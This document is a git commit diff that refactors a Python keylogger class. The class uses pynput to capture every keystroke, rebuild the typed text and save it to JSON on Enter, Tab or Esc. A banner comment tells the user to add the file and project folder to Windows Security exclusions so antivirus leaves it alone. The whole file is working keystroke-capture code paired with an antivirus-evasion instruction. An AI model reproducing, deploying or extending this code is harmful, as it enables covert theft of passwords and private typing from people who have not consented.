25e698fce2a85797c3c4ef17e7489c77b1aa9e4b
V-Perotto <vittorio.perotto@outlook.com>
2023-08-02 16:44:00 -0300

    Refatorando código; removendo código sem uso

--- app/Loggers/KeyLogger.py
+++ app/Loggers/KeyLogger.py
@@ -1,25 +1,36 @@
 #################################################################################################
 # LEMBRE-SE DE ADICIONAR ESSE ARQUIVO E A PASTA DESSE PROJETO EM EXCLUSÃO NO WINDOWS SECURITY
 #################################################################################################
-from pynput.keyboard import Listener
 # import pynput
 # if o pc for windows:
 # from pynput.keyboard._win32 import KeyCode
-from Loggers.Logger import Logger
-from Functions.JSONLib import JSONLib
 
-logger = Logger("Keyboard")
+from pynput.keyboard import Listener
+from Functions.JSONLib import JSONLib
+from Loggers.Logger import Logger
+
 json = JSONLib()
+logger = Logger("Keyboard")
 
 class KeyLogger():
 
     def __init__(self):
         self.keys = []
         self.text = ""
+        
+    def __set_keys(self, key: str, **kwargs) -> None:
+        self.keys.append(key)
+        logger.info(message=f"'{key}'", **kwargs)
 
+    def __set_text(self, text: str) -> None:
+        self.text = text
+        
+    def __get_text(self) -> str:
+        return self.text
+    
     def __add_in_text(self, txt) -> None:
         self.text += txt
-        self.set_text(self.text)
+        self.__set_text(self.text)
 
     def __replace_quotation_marks_and_key_classes(self, key) -> None:
         if '''"'"''' in str(key):
@@ -29,15 +40,8 @@ class KeyLogger():
         if not "Key." in str(key):        
             self.__add_in_text(str(key).replace("'", ""))
     
-    # def __() -> 
-    # Imagine a pessoa usar as teclas para a esquerda
-    # e querer deletar uma parte em específico, ou melhor 
-    # usar Ctrl + Shift + Left ou Right 
-    # / Ctrl + A para zerar o texto;
-    # 
-    
     def __remove_last_digit_from_text(self) -> None:
-        self.set_text(self.get_text()[:-1])
+        self.__set_text(self.__get_text()[:-1])
             
     def __add_pressed_key_in_list_of_texts(self, key) -> None:
         functions_keys = ["Key.enter", "Key.tab", "Key.esc"]
@@ -51,36 +55,30 @@ class KeyLogger():
             else:
                 self.__replace_quotation_marks_and_key_classes(key)
         if str(key) in functions_keys:
-            self.set_keys(self.get_text(), text=True)
-            self.set_keys(str(key).replace("Key.", "").upper(), key_press=key, text=False)
+            self.__set_keys(self.__get_text(), text=True)
+            self.__set_keys(str(key).replace("Key.", "").upper(), key_press=key, text=False)
             
-            json.save_text_data(self.get_text(), str(key).replace("Key.", "").upper())
+            json.save_text_data(self.__get_text(), str(key).replace("Key.", "").upper())
             self.text = "" 
         if str(key) == "Key.cmd":
-            self.set_keys("SUPER", key_press=key, text=False)
-
-    def set_keys(self, key: str, **kwargs) -> None:
-        self.keys.append(key)
-        logger.info(message=f"'{key}'", **kwargs)
+            self.__set_keys("SUPER", key_press=key, text=False)
     
-    def get_keys(self) -> list:
-        return self.keys
+    # def __() -> 
+    # Imagine a pessoa usar as teclas para a esquerda
+    # e querer deletar uma parte em específico, ou melhor 
+    # usar Ctrl + Shift + Left ou Right 
+    # / Ctrl + A para zerar o texto;
+    # 
 
-    def set_text(self, text: str) -> None:
-        self.text = text
-        
-    def get_text(self) -> str:
-        return self.text
-
-    def on_press(self, key) -> None:
+    def __on_press(self, key) -> None:
         logger.debug(message=f"{key} pressed")
         logger.info(message=f"{key}", key_press=key, text=False)
         self.__add_pressed_key_in_list_of_texts(str(key))
         
-    def on_release(self, key) -> None:
+    def __on_release(self, key) -> None:
         logger.debug(message=f"{key} released")
         
     def keyboard_listener(self) -> None:    
-        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
+        with Listener(on_press=self.__on_press, on_release=self.__on_release) as listener:
             listener.join()
             
